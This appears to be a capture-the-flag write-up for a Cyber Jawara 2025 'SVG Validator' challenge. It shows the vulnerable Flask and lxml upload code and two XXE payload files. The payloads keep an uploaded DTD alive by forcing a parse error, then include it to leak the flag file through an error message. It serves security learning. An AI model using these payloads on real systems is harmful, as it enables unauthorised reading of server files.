---
id: 17948583-e65d-8037-bf0f-d573b2499823
title: >-
  Read the file with lxml.etree that Vulnerable to XXE, include the local DTD,
  and generate an error to read the Flag: Cyber Jawara National 2025 Quals SVG
  Validator
created_time: 2025-01-12T10:59:00.000Z
last_edited_time: 2025-05-22T09:16:00.000Z
cover_image: ./imgs/mita-miside-oshinokodance-oshinokodance_bVLkwBdw.gif
icon_emoji: 🫡
categories:
  - XXE
verification:
  state: unverified
  verified_by: null
  date: null
page: >-
  Read the file with lxml.etree that Vulnerable to XXE, include the local DTD,
  and generate an error to read the Flag: Cyber Jawara National 2025 Quals SVG
  Validator
owner:
  - object: user
    id: ee7aeeeb-cd0d-4cbb-9e7e-109320ff16fa
    name: Dimas
    avatar_url: >-
      https://s3-us-west-2.amazonaws.com/public.notion-static.com/fab4bcf0-36ea-4bd6-8847-f18b157387da/92920739.png
    type: person
    person:
      email: dimasmaulana0305@gmail.com
_thumbnail: ./imgs/mita-miside-oshinokodance-oshinokodance_bVLkwBdw.gif

---

# Description

A simple SVG validator.

[image](https://prod-files-secure.s3.us-west-2.amazonaws.com/39d1be85-e7c6-4263-a666-a42da95a70df/8d6a70b2-6c3c-410a-9ddb-5303e731a08d/svg-validator.zip?X-Amz-Algorithm=AWS4-HMAC-SHA256\&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD\&X-Amz-Credential=ASIAZI2LB466SBLAD6K7%2F20250523%2Fus-west-2%2Fs3%2Faws4_request\&X-Amz-Date=20250523T133625Z\&X-Amz-Expires=3600\&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEDYaCXVzLXdlc3QtMiJIMEYCIQDxdK02bwlrMTdnNMEcCD5exmVrKWcsA0IHqUSHP4gV%2FgIhAIvXsBuH30gbrPFVmyog9UbEOTA7QqqCkVBmU4bw%2FB4DKogECO%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQABoMNjM3NDIzMTgzODA1IgwPA40YPqn1OwxlmWUq3AMUravsexInrX%2FvR70fOOhVS69sVpfAt6X6YAVGKSNzwK5LJkW2vBXnbb72T5kyCHvpFLwsoJudkDW915vVpLUX2T7Hf%2FYwf%2FQdNa6nAybjrtBhRBcgBBVLZog6rJ4cr1sVVU5IfBBUk4fxj%2Bqe5mexupoMsgm4qFv%2FuR3l7QmlAER8Y8IrpUsq6Og9KBdxKuA103XNQYMgBalDf4Pzma9JIhT%2B9%2BfUg29wHI%2BPL0F7QjDobNnbEA9H0V2gxSVMVmz0hYq2PbPzT2R0cfHeuQC%2Bk2YO%2F5UgA0iC9DNkje8cEuKHm6kbvYci6GhS5teRp1TRHRYzXZ4Gsnn2tOMeCnq8toaz1twCCKSCRXKWDVoKkmrj8iqsJg2UJGO5qz2z3IQRT4tXsOy5m7XnSG3rMP2I%2BerPEH4RzuXoOz8zqt2E0T3tUfsUxMS1PB1xqKWA3yao1M6U9aLQ2mEwe%2FRzpZBRmKJI5D8n9SEKVoBW4cX8PL7NrzZlNeqjSvqT%2Fn70SRGcmXdo%2Bf1uk79NCx1YooBsDNATFUzqZ%2BCdSPpfJqwbW0CA3CXBf6jkyCvu8gl1iia3glcEJHc0wFuj19nQx1352FM%2Byz4oQWplNLATwyJFXfBHIyujDXkKsV7P1DDz8cHBBjqkAdSlfD5GsG6xKbg2B4ZmhDB1Dnz5x8KrxI%2F5XhuWQgM3vKXvPvx1C9eGgRSS0ep10WGD2FNEWZVfPpZl6u6%2BeJSBimsB5in5rWxNniLBNTN6yDjsHC4L7zGvEfYd3X2htLb4shd%2F%2FgoyAHkwq9lQwdzKBKdyqOB6peViR5vwggNinyxKQDkAtglXBpRnzQuyV2Kty5TLneir9rpCvmz6mBqLSu3d\&X-Amz-Signature=86f1e1104cbf4507164dccd27d1f47c55964545b284a39c5dd2be8303f2ae1ca\&X-Amz-SignedHeaders=host\&x-id=GetObject)

# Exploit

In order to gain Arbitrary File Read, we will exploit the XXE vulnerability in the `lxml.etree`. We must introduce an error in the XML since we cannot read the flag information directly because we do not receive the rendered XML's direct output.

For this task, we have to save our local file on the server, but we can't because it will be deleted after validation. However, we can store and get around the `os.remove` due of a logical error:

```python
        valid = is_valid_svg(file_path)
        os.remove(file_path)

        return jsonify({'valid': valid})
    except Exception as e:
        return jsonify({'error': str(e)}), 500
```

Therefore, by making the `is_valid_svg` function throw an error, we can avoid the `os.remove` step and ensure that the file stored on the server will remain intact even if our `is_valid_svg` method gives an error.

```python
def is_valid_svg(file_path):
    tree = etree.parse(file_path)
    root = tree.getroot()
    return root.tag.endswith('svg')

@app.route('/upload', methods=['POST'])
def upload_file():
    if 'file' not in request.files:
        return jsonify({'error': 'No file part'}), 400

    file = request.files['file']

    if file.filename == '':
        return jsonify({'error': 'No selected file'}), 400

    if not allowed_file(file.filename):
        return jsonify({'error': 'Invalid file extension'}), 400

    file_path = ''

    try:
        extension = file.filename.rsplit('.', 1)[1].lower()

        filename = hashlib.sha256(
            (file.filename + str(secrets.token_hex)[:16]).encode('utf-8')
        ).hexdigest() + '.' + extension
        file_path = os.path.join(app.config['UPLOAD_FOLDER'], filename)
        file.save(file_path)

        valid = is_valid_svg(file_path)
        os.remove(file_path)

        return jsonify({'valid': valid})
    except Exception as e:
        return jsonify({'error': str(e)}), 500
```

We now need to keep one XML file on the server so that we can add it later to cause an error that will leak the flag. This is the first file we upload:

testing.svg

```python
<!ENTITY % content SYSTEM "file://app/flag.txt">
	<!ENTITY % test '<!ENTITY &#x25; file SYSTEM "file:///tmp/%content;">'>
 	%test;
```

due to the etree.Parse will automatically avoid the os.remove function and throw an error since it does not recognize this as valid XML. The second file is as follows:

file.svg

```python
<!DOCTYPE root [
	<!ENTITY % dtd SYSTEM "file:///tmp/051880fbfbd0b3f38ec3244610784c3a9c258f755039bb7cf1311fd1fc843f2d.svg">
 	%dtd;
]>
<svg></svg>
```

The file in tmp is a file that we upload before, the hash isn’t random and same each iteration because their filename isn’t use secret.token\_hex function properly:

```python
        filename = hashlib.sha256(
            (file.filename + str(secrets.token_hex)[:16]).encode('utf-8')
        ).hexdigest() + '.' + extension
```

So after we uploaded that two file we will get the flag:

![](./imgs/image_UQYv5eO4.png)
